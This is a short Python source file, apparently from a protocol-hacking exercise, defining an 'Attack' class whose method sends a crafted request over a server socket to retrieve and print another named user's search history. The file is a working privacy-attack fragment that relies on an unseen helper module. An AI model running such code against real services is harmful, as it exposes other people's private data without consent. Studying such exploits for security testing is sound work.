from tools import *


class Attack(tools):

      
    @classmethod
    def get_history(cls, name = "ricki ri") -> None:
        # ---------------------------------------------- #
        # This function get the search history of user
        # :param name: the name of person to get history of
        # :type name: str
        # :return: none
        # ---------------------------------------------- #

        id = super().find_user_id_by_name(super().server_session.sock, name)
        msg = cls.build_get_history_msg(id)
        super().server_session.sock.sendall(msg.encode())
        server_msg = super().server_session.sock.recv(200024).decode()
        data = server_msg[server_msg.find(cls._data_start) + len(cls._data_start): len(server_msg) - 3]
        data = json.loads(data)
        for i in data:
            try:
                print("[SEARCH] ", i["screen_name"])
            except TypeError:
                print("[INFO] no search history/user")
                break
